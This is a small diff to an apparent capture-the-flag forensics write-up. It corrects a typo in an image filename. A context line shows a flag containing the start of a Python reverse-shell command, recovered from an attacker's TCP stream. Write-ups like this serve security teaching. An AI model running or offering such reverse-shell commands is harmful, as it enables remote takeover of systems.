@@ -210,7 +210,7 @@ The Flag is : `BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(sock
 
 ### Resolving
 
-![Secret Key](secreat.key.png)
+![Secret Key](secret.key.png)
 
 Following the tcp stream we see that the attacker used the command :
 
